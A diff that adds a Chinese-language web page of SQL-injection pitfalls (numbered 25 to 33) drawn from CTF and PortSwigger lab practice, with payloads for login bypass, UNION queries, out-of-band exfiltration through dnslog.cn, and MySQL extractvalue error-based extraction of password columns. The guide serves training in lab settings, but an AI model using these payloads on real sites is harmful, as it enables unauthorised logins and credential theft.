+</thead>
+<tbody>
+<tr>
+<td><code>where username='administrator'</code>(31 字符)</td>
+<td><code>limit 1</code>(8 字符)</td>
+</tr>
+<tr>
+<td><code>cast(...)=1</code></td>
+<td><code>1=cast(...)</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>并且:报错里的 <code>position N</code> 能直接告诉你被截断的位置。</strong></p>
+<hr />
+<h2 id="25oob-payload">坑 25：OOB payload 里 <code>%</code> 没编码<a class="headerlink" href="#25oob-payload" title="Permanent link">&para;</a></h2>
+<h3 id="_72">现象<a class="headerlink" href="#_72" title="Permanent link">&para;</a></h3>
+<p><strong>XML 里的 <code>&lt;!ENTITY % remote ...&gt;</code> 让整个 payload 报错,平台里收不到任何请求。</strong></p>
+<h3 id="_73">原因<a class="headerlink" href="#_73" title="Permanent link">&para;</a></h3>
+<p><strong><code>%</code> 是 URL 编码的引导符。</strong> 直接写 <code>%</code> 会被当作不完整转义。</p>
+<h3 id="_74">正确做法<a class="headerlink" href="#_74" title="Permanent link">&para;</a></h3>
+<p><strong><code>%</code> → <code>%25</code>,而且必须【最先】替换:</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">enc</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>    <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">"%"</span><span class="p">,</span> <span class="s2">"%25"</span><span class="p">)</span>     <span class="c1"># 先做这个</span>
+</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a>    <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">" "</span><span class="p">,</span> <span class="s2">"+"</span><span class="p">)</span>
+</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a>    <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">'"'</span><span class="p">,</span> <span class="s2">"%22"</span><span class="p">)</span>
+</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a>    <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">";"</span><span class="p">,</span> <span class="s2">"%3B"</span><span class="p">)</span>
+</span><span id="__span-53-6"><a id="__codelineno-53-6" name="__codelineno-53-6" href="#__codelineno-53-6"></a>    <span class="k">return</span> <span class="n">s</span>
+</span></code></pre></div>
+<p><strong>顺序错了会把刚生成的 <code>%25</code> 再编码一次。</strong></p>
+<hr />
+<h2 id="26oob">坑 26：OOB 平台在国内打不开<a class="headerlink" href="#26oob" title="Permanent link">&para;</a></h2>
+<h3 id="_75">现象<a class="headerlink" href="#_75" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>interactsh (app.interactsh.com)  →  Server Unavailable...
+</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>ceye.io                          →  域名解析失败
+</span></code></pre></div>
+<h3 id="_76">原因<a class="headerlink" href="#_76" title="Permanent link">&para;</a></h3>
+<p><strong>这些服务在国内网络下不可达。</strong></p>
+<h3 id="_77">正确做法<a class="headerlink" href="#_77" title="Permanent link">&para;</a></h3>
+<p><strong>用 <code>dnslog.cn</code>(实测可用):</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>① http://www.dnslog.cn/  → Get Subdomain
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>② 拿到 xxx.dnslog.cn
+</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>③ 填进 payload
+</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a>④ 发请求后点 Refresh Record
+</span></code></pre></div>
+<p><strong>注意:dnslog 只记录 DNS,但 Oracle 发 HTTP 前必先解析域名,所以照样能抓。</strong></p>
+<hr />
+<h2 id="27-oob-portswigger">坑 27：以为换个 OOB 平台就能绕开 PortSwigger 的限制<a class="headerlink" href="#27-oob-portswigger" title="Permanent link">&para;</a></h2>
+<h3 id="_78">现象<a class="headerlink" href="#_78" title="Permanent link">&para;</a></h3>
+<p><strong>用 dnslog.cn 做 OOB 题,平台上一条记录都没有。</strong></p>
+<p><strong>（我一开始以为是"能收到但 lab 不判成功",实际是"根本收不到"。）</strong></p>
+<h3 id="_79">原因<a class="headerlink" href="#_79" title="Permanent link">&para;</a></h3>
+<p><strong>PortSwigger 的实验室环境有防火墙,阻断实验环境与「任意外部系统」的所有交互。</strong></p>
+<blockquote>
+<p>官方原话：
+「为防止学院平台被用于攻击第三方，我们的防火墙会阻止实验室与任意外部系统之间的交互。
+要解决实验室问题，您必须使用 Burp Collaborator 的<strong>默认公共服务器</strong>。」</p>
+</blockquote>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>lab 实例 → 防火墙 → 只放行 *.burpcollaborator.net
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>                    ✗ dnslog.cn
+</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>                    ✗ interactsh
+</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a>                    ✗ 你的 VPS
+</span></code></pre></div>
+<p><strong>这个设计有两个目的：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>① 让 lab 能判定成功（它监控自己的 Collaborator 服务器）
+</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a>② 防止有人拿 PortSwigger 的靶场去打第三方
+</span></code></pre></div>
+<p><strong>所以这不是「判定问题」,是「通道问题」—— 请求压根没出去。</strong></p>
+<h3 id="_80">正确做法<a class="headerlink" href="#_80" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>情况</th>
+<th>能否完成</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>有 Burp Pro</td>
+<td>✅ 用默认公共 Collaborator</td>
+</tr>
+<tr>
+<td><strong>只有 Community</strong></td>
+<td>❌ <strong>必须用 Pro 试用版</strong></td>
+</tr>
+<tr>
+<td>校赛 / CTF 靶场</td>
+<td>✅ dnslog.cn 可用（没有这层防火墙）</td>
+</tr>
+<tr>
+<td>本地搭的靶场</td>
+<td>✅ 自己的 VPS 可用</td>
+</tr>
+</tbody>
+</table>
+<p><strong>结论:社区版无法完成任何 OOB 类 lab —— 不是手法问题,是工具缺口。</strong></p>
+<p><strong>但手法是通用的 —— 只有 PortSwigger 的靶场有这层限制。</strong></p>
+<hr />
+<h2 id="28dns">坑 28：DNS 标签超长 / 含非法字符<a class="headerlink" href="#28dns" title="Permanent link">&para;</a></h2>
+<h3 id="_81">现象<a class="headerlink" href="#_81" title="Permanent link">&para;</a></h3>
+<p><strong>OOB 平台收到的是被截断的域名,或者根本没收到。</strong></p>
+<h3 id="_82">原因<a class="headerlink" href="#_82" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>限制</th>
+<th>数值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>单个标签</td>
+<td><strong>≤ 63 字符</strong></td>
+</tr>
+<tr>
+<td>允许字符</td>
+<td><code>a-z 0-9 -</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>密码里的 <code>_</code>、<code>.</code>、大写都可能出问题。</strong></p>
+<h3 id="_83">正确做法<a class="headerlink" href="#_83" title="Permanent link">&para;</a></h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="c1">-- 分段</span>
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">SUBSTR</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">30</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">'administrator'</span><span class="p">)</span>
+</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a>
+</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a><span class="c1">-- 转十六进制</span>
+</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a><span class="n">Oracle</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">RAWTOHEX</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="p">)</span>
+</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a><span class="n">MySQL</span><span class="w">  </span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">HEX</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="p">)</span>
+</span></code></pre></div>
+<hr />
+<h2 id="29sql">坑 29：参数为空，SQL 压根没执行<a class="headerlink" href="#29sql" title="Permanent link">&para;</a></h2>
+<h3 id="_84">现象<a class="headerlink" href="#_84" title="Permanent link">&para;</a></h3>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="err">GET /check.php?username=admin'#&amp;password=</span>
+</span></code></pre></div>
+<p><strong>返回:</strong></p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Input your username and password<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>    ← 545 字节
+</span></code></pre></div>
+<p><strong>看着像"注入失败",其实是"没轮到 SQL"。</strong></p>
+<h3 id="_85">原因<a class="headerlink" href="#_85" title="Permanent link">&para;</a></h3>
+<p><strong>很多程序在拼 SQL 之前先做业务校验:</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="x">$username = $_GET['username'];</span>
+</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a><span class="x">$password = $_GET['password'];</span>
+</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a>
+</span><span id="__span-61-4"><a id="__codelineno-61-4" name="__codelineno-61-4" href="#__codelineno-61-4"></a><span class="x">if (empty($username) || empty($password)) {</span>
+</span><span id="__span-61-5"><a id="__codelineno-61-5" name="__codelineno-61-5" href="#__codelineno-61-5"></a><span class="x">    die("&lt;h1&gt;Input your username and password&lt;/h1&gt;");   // ← 在这里就返回了</span>
+</span><span id="__span-61-6"><a id="__codelineno-61-6" name="__codelineno-61-6" href="#__codelineno-61-6"></a><span class="x">}</span>
+</span><span id="__span-61-7"><a id="__codelineno-61-7" name="__codelineno-61-7" href="#__codelineno-61-7"></a>
+</span><span id="__span-61-8"><a id="__codelineno-61-8" name="__codelineno-61-8" href="#__codelineno-61-8"></a><span class="x">$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";</span>
+</span></code></pre></div>
+<p><strong><code>empty($password)</code> 直接 die,后面的注入根本执行不到。</strong></p>
+<h3 id="_86">怎么分辨<a class="headerlink" href="#_86" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>页面提示</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>"请输入 / Input your..."</strong></td>
+<td><strong>前置校验没过,SQL 没执行</strong></td>
+</tr>
+<tr>
+<td>"用户名或密码错误"</td>
+<td>SQL 执行了,只是没匹配</td>
+</tr>
+<tr>
+<td>报错堆栈</td>
+<td>SQL 执行了且出错</td>
+</tr>
+</tbody>
+</table>
+<p><strong>实测对比（同一题）:</strong></p>
+<table>
+<thead>
+<tr>
+<th>请求</th>
+<th>长度</th>
+<th>页面</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>admin'%23</code> + <code>password=</code>(空)</td>
+<td><strong>545</strong></td>
+<td>Input your username and password</td>
+</tr>
+<tr>
+<td><code>admin'%23</code> + <code>password=1</code></td>
+<td><strong>813</strong></td>
+<td>Login Success!</td>
+</tr>
+<tr>
+<td><code>1'%23</code> + <code>password=21</code></td>
+<td>548</td>
+<td>NO,Wrong username password</td>
+</tr>
+</tbody>
+</table>
+<h3 id="_87">正确做法<a class="headerlink" href="#_87" title="Permanent link">&para;</a></h3>
+<p><strong>给个非空值,哪怕是无意义的 <code>1</code>:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>username=admin'%23&amp;password=1
+</span></code></pre></div>
+<h3 id="_88">同类前置校验一览<a class="headerlink" href="#_88" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>校验</th>
+<th>表现</th>
+<th>绕过</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>非空检查</strong></td>
+<td>空值直接返回</td>
+<td><strong>给个非空值</strong></td>
+</tr>
+<tr>
+<td>长度限制</td>
+<td>太短/太长被拒</td>
+<td>凑够长度</td>
+</tr>
+<tr>
+<td><code>is_numeric</code></td>
+<td>只收数字</td>
+<td>换参数或找二次注入</td>
+</tr>
+<tr>
+<td>正则白名单</td>
+<td>只允许字母数字</td>
+<td>换参数</td>
+</tr>
+<tr>
+<td>MD5 处理</td>
+<td>密码先哈希</td>
+<td><strong>只打用户名</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>教训:注入前先确认「参数能不能走到 SQL」。</strong></p>
+<hr />
+<h2 id="30url">坑 30：URL 里的 <code>#</code> 是锚点，后面参数全丢<a class="headerlink" href="#30url" title="Permanent link">&para;</a></h2>
+<h3 id="_89">现象<a class="headerlink" href="#_89" title="Permanent link">&para;</a></h3>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="err">GET /check.php?username=1'#&amp;password=21</span>
+</span></code></pre></div>
+<p><strong>返回 545 "Input your username and password"</strong> —— 和"空密码"一模一样。</p>
+<p><strong>明明写了 <code>password=21</code>,为什么说密码为空?</strong></p>
+<h3 id="_90">原因<a class="headerlink" href="#_90" title="Permanent link">&para;</a></h3>
+<p><strong><code>#</code> 在 URL 里是 fragment（锚点）的起点,后面的内容不会发给服务器。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>你发的:     /check.php?username=1'#&amp;password=21
+</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a>                                  └──────┬──────┘
+</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a>                                    被当成锚点丢弃
+</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a>
+</span><span id="__span-64-5"><a id="__codelineno-64-5" name="__codelineno-64-5" href="#__codelineno-64-5"></a>服务器收到: /check.php?username=1'
+</span><span id="__span-64-6"><a id="__codelineno-64-6" name="__codelineno-64-6" href="#__codelineno-64-6"></a>                              ↑ password 参数根本不存在
+</span></code></pre></div>
+<p><strong>→ 触发非空校验（坑 29）→ 545</strong></p>
+<h3 id="tcp">验证（原始 TCP，不经任何客户端处理）<a class="headerlink" href="#tcp" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>请求</th>
+<th>服务器返回</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>username=1'#&amp;password=21</code></td>
+<td><strong>Input your username and password</strong>（545）</td>
+</tr>
+<tr>
+<td><code>username=1'%23&amp;password=21</code></td>
+<td>NO,Wrong username password（548）</td>
+</tr>
+<tr>
+<td><code>username=admin'%23&amp;password=21</code></td>
+<td>Login Success!（813）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>说明:<code>#</code> 是服务器端（openresty）就截断了,不是工具的问题。</strong></p>
+<h3 id="_91">正确做法<a class="headerlink" href="#_91" title="Permanent link">&para;</a></h3>
+<p><strong><code>#</code> 必须写成 <code>%23</code>:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>username=admin'%23&amp;password=21
+</span></code></pre></div>
+<h3 id="_92">为什么浏览器里"好像能用"<a class="headerlink" href="#_92" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>浏览器提交表单 → 自动把 # 编码成 %23 → 正常
+</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>Burp / Caido 手打 → # 原样发出 → 服务器截断
+</span></code></pre></div>
+<p><strong>所以:在 Burp 里手写 payload,<code>#</code> 一律 <code>%23</code>。</strong></p>
+<h3 id="_93">同源问题<a class="headerlink" href="#_93" title="Permanent link">&para;</a></h3>
+<p><strong>这和坑 18（Cookie 里的 <code>;</code> 必须 <code>%3B</code>）是同一类:</strong></p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>在 HTTP 层的作用</th>
+<th>必须编码成</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>;</code></td>
+<td>Cookie 分隔符</td>
+<td><code>%3B</code></td>
+</tr>
+<tr>
+<td><code>#</code></td>
+<td>URL 锚点起点</td>
+<td><code>%23</code></td>
+</tr>
+<tr>
+<td><code>&amp;</code></td>
+<td>参数分隔符（值里出现时）</td>
+<td><code>%26</code></td>
+</tr>
+<tr>
+<td><code>+</code></td>
+<td>空格（表单编码）</td>
+<td>想表达 <code>+</code> 时写 <code>%2B</code></td>
+</tr>
+<tr>
+<td>空格</td>
+<td>非法字符</td>
+<td><code>%20</code> 或 <code>+</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>一句话:payload 里的特殊字符,先想它在 HTTP 层是什么意思。</strong></p>
+<hr />
+<h2 id="31">坑 31：<code>'</code> 前面那个值不是真实用户<a class="headerlink" href="#31" title="Permanent link">&para;</a></h2>
+<h3 id="_94">现象<a class="headerlink" href="#_94" title="Permanent link">&para;</a></h3>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="err">GET /check.php?username=1'%23&amp;password=21</span>
+</span></code></pre></div>
+<p><strong>返回:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>NO,Wrong username password！！！
+</span></code></pre></div>
+<p><strong>注入语法是对的,但登录还是失败。</strong></p>
+<h3 id="_95">原因<a class="headerlink" href="#_95" title="Permanent link">&para;</a></h3>
+<p><strong><code>1'#</code> 拼出来的 SQL 是:</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">'1'</span>
+</span></code></pre></div>
+<p><strong>数据库里没有叫 <code>1</code> 的用户 → 查不到行 → 判定登录失败。</strong></p>
+<p><strong>注入成功了,但"逻辑上"没匹配到任何数据。</strong></p>
+<h3 id="_96">三种写法,三种用途<a class="headerlink" href="#_96" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>目的</th>
+<th>写法</th>
+<th>用户必须存在吗</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>登录绕过（已知用户）</td>
+<td><code>admin'#</code></td>
+<td>✅ 需要</td>
+</tr>
+<tr>
+<td><strong>登录绕过（万能）</strong></td>
+<td><code>' or 1=1#</code></td>
+<td>❌ 不需要</td>
+</tr>
+<tr>
+<td><strong>UNION 取数据</strong></td>
+<td><code>-1' union select 1,2,3#</code></td>
+<td>❌ 故意查空</td>
+</tr>
+</tbody>
+</table>
+<p><strong>万能密码的 SQL:</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">''</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">#</span><span class="s1">' AND password='</span><span class="mi">21</span><span class="err">'</span>
+</span></code></pre></div>
+<p><strong><code>1=1</code> 恒真 → 返回表里第一行 → 登录成功。</strong></p>
+<h3 id="_97">正确做法<a class="headerlink" href="#_97" title="Permanent link">&para;</a></h3>
+<p><strong>不知道用户名时用:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>username='%20or%201=1%23&amp;password=1
+</span></code></pre></div>
+<p><strong>实测同样返回 813 "Login Success"。</strong></p>
+<h3 id="union-1">顺手记：为什么 UNION 要用 <code>-1'</code><a class="headerlink" href="#union-1" title="Permanent link">&para;</a></h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a><span class="k">admin</span><span class="s1">'  union select 1,2,3#   -- admin 那行先返回,页面显示 admin,union 结果被盖住</span>
+</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a><span class="s1">-1'</span><span class="w">     </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="o">#</span><span class="w">   </span><span class="c1">-- 查不到任何行,页面只显示 union 的结果</span>
+</span></code></pre></div>
+<p><strong><code>-1</code> 是"故意让它查不到",这样 UNION 的结果才看得见。</strong></p>
+<p><strong>这是每道 UNION 题都要用的技巧,不是随便选个数字。</strong></p>
+<hr />
+<h2 id="32-31">坑 32：报错注入只回了 31 个字符，以为数据丢了<a class="headerlink" href="#32-31" title="Permanent link">&para;</a></h2>
+<h3 id="_98">现象<a class="headerlink" href="#_98" title="Permanent link">&para;</a></h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a><span class="err">'</span><span class="k">or</span><span class="p">(</span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="p">(</span><span class="n">group_concat</span><span class="p">(</span><span class="n">password</span><span class="p">))</span><span class="k">from</span><span class="p">(</span><span class="n">H4rDsq1</span><span class="p">)))))</span><span class="o">#</span>
+</span></code></pre></div>
+<p><strong>只回了:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>Error! XPATH syntax error: '~CTF2{461c1496-eec5-4e07-b12a-94'
+</span></code></pre></div>
+<p><strong>长度 42 的 flag 只出来 31 个字符,后半截没了。</strong></p>
+<h3 id="_99">原因<a class="headerlink" href="#_99" title="Permanent link">&para;</a></h3>
+<p><strong>MySQL 的 XPATH 报错最多显示 32 个字符,其中 <code>~</code> 占 1 个 → 数据只剩 31 个。</strong></p>
+<p><strong>实测(故意塞 36 个字符):</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>输入:'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a>输出:'~ABCDEFGHIJKLMNOPQRSTUVWXYZ01234'
+</span><span id="__span-75-3"><a id="__codelineno-75-3" name="__codelineno-75-3" href="#__codelineno-75-3"></a>     └┬┘└────────── 31 个 ──────────┘
+</span></code></pre></div>
+<p><strong>不是数据丢了,是消息太长了 MySQL 不肯全打。</strong></p>
+<h3 id="_100">正确做法<a class="headerlink" href="#_100" title="Permanent link">&para;</a></h3>
+<p><strong>分片取,公式 <code>right(left(数据, 结束位置), 31)</code>:</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a><span class="c1">-- 第 1~31</span>
+</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a><span class="s1">'or(extractvalue(1,concat(0x7e,(select(left(group_concat(password),31))from(H4rDsq1)))))#</span>
+</span><span id="__span-76-3"><a id="__codelineno-76-3" name="__codelineno-76-3" href="#__codelineno-76-3"></a>
+</span><span id="__span-76-4"><a id="__codelineno-76-4" name="__codelineno-76-4" href="#__codelineno-76-4"></a><span class="s1">-- 第 32~62</span>
+</span><span id="__span-76-5"><a id="__codelineno-76-5" name="__codelineno-76-5" href="#__codelineno-76-5"></a><span class="s1">'</span><span class="k">or</span><span class="p">(</span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="p">(</span><span class="k">right</span><span class="p">(</span><span class="k">left</span><span class="p">(</span><span class="n">group_concat</span><span class="p">(</span><span class="n">password</span><span class="p">),</span><span class="mi">62</span><span class="p">),</span><span class="mi">31</span><span class="p">))</span><span class="k">from</span><span class="p">(</span><span class="n">H4rDsq1</span><span class="p">)))))</span><span class="o">#</span>
+</span></code></pre></div>
+<p><strong>先查 <code>length()</code> 知道总长,再按 31 一段切,最后拼起来。</strong></p>
+<p><strong>其他数据库的限制不一样:</strong></p>
+<table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>一次能带</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MySQL <code>extractvalue</code></td>
+<td><strong>31</strong></td>
+</tr>
+<tr>
+<td>Oracle <code>XMLType</code></td>
+<td>约 64</td>
+</tr>
+<tr>
+<td>PostgreSQL <code>CAST</code></td>
+<td>较长</td>
+</tr>
+<tr>
+<td>SQL Server <code>CONVERT</code></td>
+<td>较长</td>
+</tr>
+</tbody>
+</table>
+<p><strong>MySQL 还有能带更多字符的:</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a><span class="err">'</span><span class="w"> </span><span class="k">or</span><span class="p">(</span><span class="n">geometrycollection</span><span class="p">((</span><span class="k">select</span><span class="p">(</span><span class="n">group_concat</span><span class="p">(</span><span class="n">password</span><span class="p">))</span><span class="k">from</span><span class="p">(</span><span class="n">H4rDsq1</span><span class="p">))))</span><span class="o">#</span>
+</span></code></pre></div>
+<hr />
+<h2 id="33">坑 33：没测报错回显，直接闷头做盲注<a class="headerlink" href="#33" title="Permanent link">&para;</a></h2>
+<h3 id="_101">现象<a class="headerlink" href="#_101" title="Permanent link">&para;</a></h3>
+<p><strong>花了半小时写二分脚本,跑了 300 多条请求,才拿到 20 个字符。</strong></p>
+<p><strong>而旁边一条报错注入请求就能回 31 个字符。</strong></p>
+<h3 id="_102">原因<a class="headerlink" href="#_102" title="Permanent link">&para;</a></h3>
+<p><strong>决策顺序错了。</strong></p>
+<h3 id="_103">正确做法:按这个顺序选打法<a class="headerlink" href="#_103" title="Permanent link">&para;</a></h3>
